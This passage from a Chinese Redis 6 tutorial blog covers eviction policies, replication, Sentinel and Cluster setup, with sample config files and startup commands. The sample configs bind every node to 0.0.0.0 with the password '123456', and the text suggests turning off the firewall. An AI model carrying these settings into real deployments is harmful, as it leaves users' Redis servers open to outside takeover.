key，然后你也没及时去查，也就没走惰性删除，此时会怎么样？</li><li>如果大量过期 key 堆积在内存里，导致 redis 内存块耗尽了，就需要走内存淘汰机制</li><li>设计缓存中间件：可以参考redis的key过期淘汰方式和内存不足淘汰方式</li></ul></li></ul><h2 id="内存不足时-Redis的Key内存淘汰策略"><a href="#内存不足时-Redis的Key内存淘汰策略" class="headerlink" title="内存不足时-Redis的Key内存淘汰策略"></a><strong>内存不足时-Redis的Key内存淘汰策略</strong></h2></li></ul><p>策略</p><ul><li><p>volatile-lru(least recently used)</p><ul><li>最近最少使用算法，从设置了过期时间的键中选择空转时间最长的键值对清除掉；</li></ul></li><li><p>volatile-lfu(least frequently used)</p><ul><li>最近最不经常使用算法，从设置了过期时间的键中选择某段时间之内使用频次最小的键值对清除掉；</li></ul></li><li><p>volatile-ttl</p><ul><li>从设置了过期时间的键中选择过期时间最早的键值对清除 (删除即将过期的）</li></ul></li><li><p>volatile-random</p><ul><li>从设置了过期时间的键中，随机选择键进行清除；</li></ul></li><li><p>allkeys-lru</p><ul><li>最近最少使用算法，从所有的键中选择空转时间最长的键值对清除；</li></ul></li><li><p>allkeys-random</p><ul><li>所有的键中，随机选择键进行删除；</li></ul></li><li><p>noeviction</p><ul><li>不做任何的清理工作，在redis的内存超过限制之后，所有的写入操作都会返回错误；但是读操作都能正常的进行;</li></ul></li><li><p>config配置的时候 下划线_的key需要用中横线-</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set maxmemory_policy volatile-lru</span><br><span class="line">(error) ERR Unsupported CONFIG parameter: maxmemory_policy</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; config set maxmemory-policy volatile-lru</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h1 id="Redis6-X高可用之主从复制-读写分离"><a href="#Redis6-X高可用之主从复制-读写分离" class="headerlink" title="Redis6.X高可用之主从复制+读写分离"></a>Redis6.X高可用之主从复制+读写分离</h1><h2 id="Redis6-X主从复制-读写分离介绍"><a href="#Redis6-X主从复制-读写分离介绍" class="headerlink" title="Redis6.X主从复制+读写分离介绍"></a><strong>Redis6.X主从复制+读写分离介绍</strong></h2><p>背景</p><ul><li>单机部署简单，但是可靠性低，且不能很好利用CPU多核处理能力</li><li>生产环境-必须要保证高可用-一般不可能单机部署</li><li>读写分离是可用性要求不高、性能要求较高、数据规模小的情况；</li></ul><p>目标</p><ul><li>读写分离，扩展主节点的读能力，分担主节点读压力</li><li>容灾恢复，一旦主节点宕机，从节点作为主节点的备份可以随时顶上来</li></ul><p>Redis主从架构介绍</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024231921.png" alt="image-20211024231918594"></p><h2 id="Linux服务器-Redis6-X-主从复制-一主二从架构环境准备"><a href="#Linux服务器-Redis6-X-主从复制-一主二从架构环境准备" class="headerlink" title="Linux服务器-Redis6.X 主从复制 一主二从架构环境准备"></a>Linux服务器-Redis6.X 主从复制 一主二从架构环境准备</h2><ul><li>配置</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data/redis/master/data </span><br><span class="line">mkdir -p /data/redis/slave1/data </span><br><span class="line">mkdir -p /data/redis/slave2/data</span><br><span class="line"></span><br><span class="line"><span class="comment">#从节点开启只读模式(默认)</span></span><br><span class="line">replica-read-only yes</span><br><span class="line"><span class="comment">#从节点访问主节点的密码，和requirepass一样</span></span><br><span class="line">masterauth 123456</span><br><span class="line"><span class="comment">#哪个主节点进行复制</span></span><br><span class="line">replicaof 8.129.113.233 6379</span><br></pre></td></tr></table></figure><ul><li>创建主配置文件redis.conf</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">port</span> <span class="number">6379</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="string">requirepass</span> <span class="string">"123456"</span></span><br><span class="line"></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis1.log"</span></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">"xdclass1.rdb"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/usr/local/redis/data"</span></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">appendfilename</span> <span class="string">"appendonly1.aof"</span></span><br><span class="line"><span class="string">masterauth</span> <span class="string">"123456"</span></span><br></pre></td></tr></table></figure><ul><li>创建两个从配置文件redis.conf</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">port</span> <span class="number">6380</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">requirepass</span> <span class="string">"123456"</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis2.log"</span></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">"xdclass2.rdb"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/usr/local/redis/data"</span></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">appendfilename</span> <span class="string">"appendonly2.aof"</span></span><br><span class="line"><span class="string">replicaof</span> <span class="number">8.129</span><span class="number">.113</span><span class="number">.233</span> <span class="number">6379</span></span><br><span class="line"><span class="string">masterauth</span> <span class="string">"123456"</span></span><br></pre></td></tr></table></figure><ul><li><p>防火墙记得关闭，或者开放对应的端口</p><ul><li>阿里云服务器记得开发网络安全组</li></ul></li><li><p>启动</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动主</span></span><br><span class="line">./redis-server /data/redis/master/data/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动从</span></span><br><span class="line">./redis-server /data/redis/slave1/data/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动从</span></span><br><span class="line">./redis-server /data/redis/slave2/data/redis.conf</span><br></pre></td></tr></table></figure><ul><li><p>info replication 查看状态</p></li><li><p>主从复制和读写验证</p></li><li><p>防火墙和网络安全组记得开放端口</p><ul><li>6379 主节点</li><li>6380 从节点</li><li>6381 从节点</li></ul></li></ul><h2 id="Redis6-X主从架构-复制读写分离原理解析"><a href="#Redis6-X主从架构-复制读写分离原理解析" class="headerlink" title="Redis6.X主从架构-复制读写分离原理解析"></a>Redis6.X主从架构-复制读写分离原理解析</h2><ul><li>主从复制分两种（主从刚连接的时候，进行全量同步；全同步结束后，进行增量同步）<ul><li>全量复制<ul><li>master服务器会开启一个后台进程用于将redis中的数据生成一个rdb文件</li><li>主服务器会缓存所有接收到的来自客户端的写命令，当后台保存进程处理完毕后，会将该rdb文件传递给slave服务器</li><li>slave服务器会将rdb文件保存在磁盘并通过读取该文件将数据加载到内存</li><li>在此之后master服务器会将在此期间缓存的命令通过redis传输协议发送给slave服务器</li><li>然后slave服务器将这些命令依次作用于自己本地的数据集上最终达到数据的一致性</li></ul></li><li>增量复制<ul><li>Slave初始化后开始正常工作时主服务器发生的写操作同步到从服务器的过程</li><li>服务器每执行一个写命令就会向从服务器发送相同的写命令，从服务器接收并执行收到的写命令</li></ul></li></ul></li></ul><p>特点</p><ul><li><p>主从复制对于 主/从 redis服务器来说是非阻塞的，所以同步期间都可以正常处理外界请求</p></li><li><p>一个主redis可以含有多个从redis，每个从redis可以接收来自其他从redis服务器的连接</p></li><li><p>从节点不会让key过期，而是主节点的key过期删除后，成为del命令传输到从节点进行删除</p><ul><li>从节点开启 sync 看日志</li></ul></li><li><p>加速复制</p><ul><li>完全重新同步需要在磁盘上创建一个RDB文件，然后加载这个文件以便为从服务器发送数据</li><li>在比较低速的磁盘，这种操作会给主服务器带来较大的压力</li><li>新版支持无磁盘的复制，子进程直接将RDB通过网络发送给从服务器，不使用磁盘作为中间存储</li><li>repl-diskless-sync yes (默认是no)</li></ul></li><li><p>主从断开重连</p><ul><li>如果遭遇连接断开，重新连接之后可以从中断处继续进行复制，而不必重新同步</li><li>2.8版本后 部分重新同步这个新特性内部使用PSYNC命令，旧的实现中使用SYNC命令</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211024235336.png" alt="image-20211024235333238"></p><h1 id="Redis6-X高可用之主从-Sentinel哨兵监控"><a href="#Redis6-X高可用之主从-Sentinel哨兵监控" class="headerlink" title="Redis6.X高可用之主从+Sentinel哨兵监控"></a>Redis6.X高可用之主从+Sentinel哨兵监控</h1><h2 id="Redis6-X节点高可用监控之Sentinel介绍"><a href="#Redis6-X节点高可用监控之Sentinel介绍" class="headerlink" title="Redis6.X节点高可用监控之Sentinel介绍"></a><strong>Redis6.X节点高可用监控之Sentinel介绍</strong></h2><ul><li><p>背景</p></li><li><p>前面搭建了主从，当主服务器宕机后，需要手动把一台从服务器切换为主服务器，人工干预费事费力，还会造成一段时间内服务不可用</p></li><li><p>哨兵模式介绍</p><ul><li>Redis提供了哨兵的命令，是一个独立的进程</li><li>原理 哨兵通过发送命令给多个节点，等待Redis服务器响应，从而监控运行的多个Redis实例的运行情况</li><li>当哨兵监测到master宕机，会自动将slave切换成master，通过通知其他的从服务器，修改配置文件切换主机</li></ul></li><li><p>Sentinel三大工作任务</p><ul><li>监控（Monitoring）<ul><li>Sentinel 会不断地检查你的主服务器和从服务器是否运作正常</li></ul></li><li>提醒（Notification）<ul><li>当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知</li></ul></li><li>自动故障迁移（Automatic failover）<ul><li>当一个主服务器不能正常工作时， Sentinel 会开始一次自动故障迁移操作， 它会将失效主服务器的其中一个从服务器升级为新的主服务器， 并让失效主服务器的其他从服务器改为复制新的主服务器</li><li>当客户端试图连接失效的主服务器时， 集群也会向客户端返回新主服务器的地址， 使得集群可以使用新主服务器代替失效服务器</li></ul></li></ul></li><li><p>问题</p><ul><li>一个哨兵进程对Redis服务器进行监控，可能会出现问题</li><li>一般是使用多个哨兵进行监控，各个哨兵之间还会进行监控，形成多哨兵模式</li></ul></li><li><p>多哨兵模式下线名称介绍</p><ul><li>主观下线（Subjectively Down， 简称 SDOWN）<ul><li>是单个 Sentinel 实例对服务器做出的下线判断，比如网络问题接收不到通知等</li><li>一个服务器没有在 down-after-milliseconds 选项所指定的时间内， 对向它发送 PING 命令的 Sentinel 返回一个有效回复（valid reply）， 那么 Sentinel 就会将这个服务器标记为主观下线</li></ul></li><li>客观下线（Objectively Down， 简称 ODOWN）<ul><li>指的是多个 Sentinel 实例在对同一个服务器做出 SDOWN 判断， 并且通过 SENTINEL is-master-down-by-addr 命令互相交流之后， 得出的服务器下线判断</li><li>一个 Sentinel 可以通过向另一个 Sentinel 发送 SENTINEL is-master-down-by-addr 命令来询问对方是否认为给定的服务器已下线</li><li>客观下线条件只适用于主服务器</li></ul></li><li>仲裁 qurum<ul><li>Sentinel 在给定的时间范围内， 从其他 Sentinel 那里接收到了【足够数量】的主服务器下线报告， 那么 Sentinel 就会将主服务器的状态从主观下线改变为客观下线</li><li>这个【足够数量】就是配置文件里面的值，一般是Sentinel个数的一半加1，比如3个Sentinel则就设置为2</li><li>down-after-milliseconds 是一个哨兵在超过规定时间依旧没有得到响应后，会自己认为主机不可用</li><li>当拥有认为主观下线的哨兵达到sentinel monitor所配置的数量时，就会发起一次投票，进行failover</li></ul></li></ul></li><li><p>核心流程</p><ul><li>每秒ping，超过时间不响应 则认为主观下线</li><li>满足多个，则认为是客观下线</li><li>投票选择主节点</li><li>如果没有足够的节点同意master下线，则状态会被移除</li></ul></li><li><p>环境准备</p><ul><li>配置3个哨兵，每个哨兵的配置都是一样的</li><li>启动顺序 先启动主再启动从，最后启动3个哨兵</li><li>哨兵端口是 【26379】记得开放</li></ul></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#不限制ip</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 让sentinel服务后台运行</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置监听的主服务器，mymaster代表服务器的名称，自定义，172.18.172.109 代表监控的主服务器，6379代表端口，</span></span><br><span class="line"><span class="comment">#2代表只有两个或两个以上的哨兵认为主服务器不可用的时候，才会进行failover操作。</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">monitor</span> <span class="string">mymaster</span> <span class="number">172.18</span><span class="number">.172</span><span class="number">.109</span> <span class="number">6379</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sentinel auth-pass定义服务的密码，mymaster是服务名称，123456是Redis服务器密码</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">auth-pass</span> <span class="string">mymaster</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#超过5秒master还没有连接上，则认为master已经停止</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">down-after-milliseconds</span> <span class="string">mymaster</span> <span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果该时间内没完成failover操作，则认为本次failover失败</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">failover-timeout</span> <span class="string">mymaster</span> <span class="number">30000</span></span><br></pre></td></tr></table></figure><ul><li>在目录下创建3个文件sentinel-1.conf、sentinel-2.conf、sentinel-3.conf</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">port</span> <span class="number">26379</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">pidfile</span> <span class="string">"/var/run/redis-sentinel-1.pid"</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/var/log/redis/sentinel_26379.log"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/tmp"</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">monitor</span> <span class="string">mymaster</span> <span class="number">8.129</span><span class="number">.113</span><span class="number">.233</span> <span class="number">6379</span> <span class="number">2</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">down-after-milliseconds</span> <span class="string">mymaster</span> <span class="number">5000</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">auth-pass</span> <span class="string">mymaster</span> <span class="number">123456</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">failover-timeout</span> <span class="string">mymaster</span> <span class="number">30000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">port</span> <span class="number">26380</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">pidfile</span> <span class="string">"/var/run/redis-sentinel-2.pid"</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/var/log/redis/sentinel_26380.log"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/tmp"</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">monitor</span> <span class="string">mymaster</span> <span class="number">8.129</span><span class="number">.113</span><span class="number">.233</span> <span class="number">6379</span> <span class="number">2</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">down-after-milliseconds</span> <span class="string">mymaster</span> <span class="number">5000</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">auth-pass</span> <span class="string">mymaster</span> <span class="number">123456</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">failover-timeout</span> <span class="string">mymaster</span> <span class="number">30000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">port</span> <span class="number">26381</span></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">pidfile</span> <span class="string">"/var/run/redis-sentinel-3.pid"</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/var/log/redis/sentinel_26381.log"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/tmp"</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">monitor</span> <span class="string">mymaster</span> <span class="number">8.129</span><span class="number">.113</span><span class="number">.233</span> <span class="number">6379</span> <span class="number">2</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">down-after-milliseconds</span> <span class="string">mymaster</span> <span class="number">5000</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">auth-pass</span> <span class="string">mymaster</span> <span class="number">123456</span></span><br><span class="line"><span class="string">sentinel</span> <span class="string">failover-timeout</span> <span class="string">mymaster</span> <span class="number">30000</span></span><br></pre></td></tr></table></figure><ul><li><p>记得创建 /var/log/redis 文件夹</p></li><li><p>启动哨兵集群</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./redis-server /usr/<span class="built_in">local</span>/redis/conf/sentinel-1.conf --sentinel</span><br><span class="line"></span><br><span class="line">./redis-server /usr/<span class="built_in">local</span>/redis/conf/sentinel-2.conf --sentinel</span><br><span class="line"></span><br><span class="line">./redis-server /usr/<span class="built_in">local</span>/redis/conf/sentinel-3.conf --sentinel</span><br></pre></td></tr></table></figure><ul><li><p>网络安全组需要开放端口</p></li><li><p>优点</p><ul><li>主从可以自动切换，可用性更高</li></ul></li><li><p>缺点</p><ul><li>主从切换会丢失短暂数据</li><li>主节点的写能力和存储能力受限</li></ul><h2 id="新版SpringBoot-微服务cloud整合Redis主从-Sentinel哨兵"><a href="#新版SpringBoot-微服务cloud整合Redis主从-Sentinel哨兵" class="headerlink" title="新版SpringBoot/微服务cloud整合Redis主从+Sentinel哨兵"></a>新版SpringBoot/微服务cloud整合Redis主从+Sentinel哨兵</h2></li><li><p>注释掉 host和port</p></li><li><p>新增配置</p></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sentinel:</span></span><br><span class="line">  <span class="attr">master:</span> <span class="string">mymaster</span></span><br><span class="line">  <span class="attr">nodes:</span> <span class="number">8.129</span><span class="number">.113</span><span class="number">.233</span><span class="string">:26379,8.129.113.233:26380,8.129.113.233:26381</span></span><br></pre></td></tr></table></figure><h1 id="Redis6-X高可用之Cluster集群和分片"><a href="#Redis6-X高可用之Cluster集群和分片" class="headerlink" title="Redis6.X高可用之Cluster集群和分片"></a>Redis6.X高可用之Cluster集群和分片</h1><ul><li><p>背景</p><ul><li>Sentinel解决了主从架构故障自动迁移的问题</li><li>但是Master主节点的写能力和存储能力依旧受限</li><li>使用Redis的集群cluster就是为了解决单机Redis容量有限的问题，将数据按一定的规则分配到多台机器</li></ul></li><li><p>什么是集群Cluster</p><ul><li>是一组相互独立的、通过高速网络互联的计算机，它们构成了一个组，并以单一系统的模式加以管理</li><li>容易和分布式弄混，分布式系统简单的可以认为就一个庞大的系统，进行拆分度多个小系统</li></ul></li><li><p>例子：小滴课堂-老王，去银行存钱</p><ul><li>Anna小姐姐是窗口一的工作人员，包括取号、开户、存钱、挂失、对公业务等等</li><li>问题一<ul><li>Anna小姐姐事情很多导致效率低，就找几个人，每个人负责不同的事情，客户根据需求进行选择，这个就是分布式。</li></ul></li><li>问题二<ul><li>老帆是负责存钱的，只有一个窗口导致排长队，集群的话就可以搞多个窗口，同时对外提供服务</li></ul></li></ul></li><li><p>Redis集群模式介绍</p><ul><li>Cluster模式是Redis3.0开始推出</li><li>采用无中心结构，每个节点保存数据和整个集群状态, 每个节点都和其他所有节点连接</li><li>官方要求：至少6个节点才可以保证高可用，即3主3从；扩展性强、更好做到高可用</li><li>各个节点会互相通信，采用gossip协议交换节点元数据信息</li><li>数据分散存储到各个节点上</li></ul></li></ul><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025082921.png" alt="image-20211025082907420" style="zoom:67%;" /><h2 id="Redis6-X节点高可用之Cluster数据分片和虚拟哈希槽介绍"><a href="#Redis6-X节点高可用之Cluster数据分片和虚拟哈希槽介绍" class="headerlink" title="Redis6.X节点高可用之Cluster数据分片和虚拟哈希槽介绍"></a>Redis6.X节点高可用之Cluster数据分片和虚拟哈希槽介绍</h2><p>背景</p><ul><li>主节点的写能力和存储能力受限</li><li>单台机器无法满足需求，因此把数据分散存储到多个机器</li><li>类似案例：mysql分库分表</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025083125.png" alt="image-20211025083116811"></p><p>常见的数据分区算法</p><ul><li><p>哈希取模</p><ul><li>对选择的 partitioning key 计算其哈希值，得到的哈希值就是对应的分区</li></ul></li><li><p>范围分片</p><ul><li>通过确定分区键是否在某个范围内来选择分区</li></ul></li><li><p>一致性Hash分区</p></li><li><p>redis cluster集群没有采用一致性哈希方案，而是采用【数据分片】中的哈希槽来进行数据存储与读取的</p></li></ul><p>什么是Redis的哈希槽 slot</p><ul><li>Redis集群预分好16384个槽，当需要在 Redis 集群中放置一个 key-value 时，根据 CRC16(key) mod 16384的值，决定将一个key放到哪个桶中</li></ul><p>大体流程</p><ul><li><p>假设主节点的数量为3，将16384个槽位按照【用户自己的规则】去分配这3个节点，每个节点复制一部分槽位</p><ul><li>节点1的槽位区间范围为0-5460</li><li>节点2的槽位区间范围为5461-10922</li><li>节点3的槽位区间范围为10923-16383</li><li>注意：从节点是没有槽位的，只有主节点才有</li></ul></li><li><p>存储查找</p><ul><li>对要存储查找的键进行crc16哈希运算,得到一个值，并取模16384，判断这个值在哪个节点的范围区间</li><li>假设crc16(“test_key”)%16384=3000，就是节点一</li><li>crc16算法不是简单的hash算法，是一种校验算法</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025083501.png" alt="image-20211025083458227"></p><ul><li><p>使用哈希槽的好处就在于可以方便的添加或移除节点。</p><ul><li>当需要增加节点时，只需要把其他节点的某些哈希槽挪到新节点就可以了；</li><li>当需要移除节点时，只需要把移除节点上的哈希槽挪到其他节点就行了</li></ul><h2 id="Redis6-X节点高可用之Cluster集群环境准备"><a href="#Redis6-X节点高可用之Cluster集群环境准备" class="headerlink" title="Redis6.X节点高可用之Cluster集群环境准备"></a>Redis6.X节点高可用之Cluster集群环境准备</h2></li><li><p>说明</p><ul><li>旧版本的需要使用ruby语言进行构建，新版5之后直接用redis-cli即可</li><li>6个节点，三主双从，主从节点会自动分配，不是人工指定</li><li>主节点故障后，从节点会替换主节点</li></ul></li><li><p>注意点：</p><ul><li>把之前的rdb、aof文件删除</li></ul></li><li><p>节点(网络安全组开放端口)</p><ul><li>6381、6382</li><li>6383、6384</li><li>6385、6386</li></ul></li></ul><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211025083904.png" alt="image-20211025083859033" style="zoom:80%;" /><ul><li>配置</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">port</span> <span class="number">6381</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">requirepass</span> <span class="string">"123456"</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis1.log"</span></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">"xdclass1.rdb"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/usr/local/redis/data"</span></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">appendfilename</span> <span class="string">"appendonly1.aof"</span></span><br><span class="line"><span class="string">masterauth</span> <span class="string">"123456"</span></span><br><span class="line"><span class="comment">#是否开启集群</span></span><br><span class="line"><span class="string">cluster-enabled</span> <span class="literal">yes</span></span><br><span class="line"><span class="comment"># 生成的node文件，记录集群节点信息，默认为nodes.conf，防止冲突，改为nodes-6381.conf</span></span><br><span class="line"><span class="string">cluster-config-file</span> <span class="string">nodes-6381.conf</span></span><br><span class="line"><span class="comment">#节点连接超时时间</span></span><br><span class="line"><span class="string">cluster-node-timeout</span> <span class="number">20000</span></span><br><span class="line"><span class="comment">#集群节点的ip，当前节点的ip</span></span><br><span class="line"><span class="string">cluster-announce-ip</span> <span class="number">172.18</span><span class="number">.172</span><span class="number">.109</span></span><br><span class="line"><span class="comment">#集群节点映射端口</span></span><br><span class="line"><span class="string">cluster-announce-port</span> <span class="number">6381</span></span><br><span class="line"><span class="comment">#集群节点总线端口,节点之间互相通信，常规端口+1万</span></span><br><span class="line"><span class="string">cluster-announce-bus-port</span> <span class="number">16381</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">bind</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="string">port</span> <span class="number">6386</span></span><br><span class="line"><span class="string">daemonize</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">requirepass</span> <span class="string">"123456"</span></span><br><span class="line"><span class="string">logfile</span> <span class="string">"/usr/local/redis/log/redis6.log"</span></span><br><span class="line"><span class="string">dbfilename</span> <span class="string">"xdclass6.rdb"</span></span><br><span class="line"><span class="string">dir</span> <span class="string">"/usr/local/redis/data"</span></span><br><span class="line"><span class="string">appendonly</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">appendfilename</span> <span class="string">"appendonly6.aof"</span></span><br><span class="line"><span class="string">masterauth</span> <span class="string">"123456"</span></span><br><span class="line"></span><br><span class="line"><span class="string">cluster-enabled</span> <span class="literal">yes</span></span><br><span class="line"><span class="string">cluster-config-file</span> <span class="string">nodes-6386.conf</span></span><br><span class="line"><span class="string">cluster-node-timeout</span> <span class="number">20000</span></span><br><span class="line"><span class="string">cluster-announce-ip</span> <span class="number">172.18</span><span class="number">.172</span><span class="number">.109</span></span><br><span class="line"><span class="string">cluster-announce-port</span> <span class="number">6386</span></span><br><span class="line"><span class="string">cluster-announce-bus-port</span> <span 